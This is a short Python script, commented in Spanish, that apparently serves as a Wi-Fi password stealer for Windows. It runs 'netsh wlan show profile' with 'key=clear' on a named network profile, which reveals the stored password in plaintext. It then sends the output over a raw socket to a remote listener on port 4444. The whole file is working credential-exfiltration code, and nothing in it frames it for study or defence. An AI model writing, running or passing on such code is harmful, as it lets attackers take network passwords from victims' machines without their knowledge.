import socket
import subprocess

#ip del servidor
ip = ("10.0.0.0",4444)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(ip)

result = subprocess.run(
    ['netsh', 'wlan', 'show', 'profile', 'Agueda Reyes', 'key=clear'],
    capture_output=True, text=True
)

p = result.stdout

s.send(p.encode())

s.close()
